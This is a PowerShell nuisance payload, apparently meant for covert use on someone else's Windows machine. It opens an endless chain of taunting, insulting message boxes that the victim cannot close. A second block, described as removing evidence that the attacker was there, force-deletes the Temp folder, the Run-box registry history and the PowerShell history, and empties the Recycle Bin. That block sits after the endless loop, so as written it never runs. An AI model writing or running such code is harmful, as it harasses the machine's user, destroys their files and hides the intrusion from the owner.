Add-Type -AssemblyName System.Windows.Forms

# Number of cycles to repeat
$cycles = 1000

# List of messages
$msgs = @("nah", "nuh uh", "nope", "no", "naw")

# First two messages
$initialMsgs = @(":3", "nah bitch dont u try to close me","i just wanted to be friends :(","Im not going to let you close me")

for ($i = 1; $i -le $cycles; $i++) {
    # Always show the first two messages
    foreach ($msg in $initialMsgs) {
        [System.Windows.Forms.MessageBox]::Show($msg, "Haii :3", 0, 'Information')
    }

    # Randomly select and display messages for subsequent iterations
    while ($true) {
        $randomMsg = $msgs | Get-Random
        [System.Windows.Forms.MessageBox]::Show($randomMsg, ">:(", 0, 'Information')
    }
}  

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>
# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
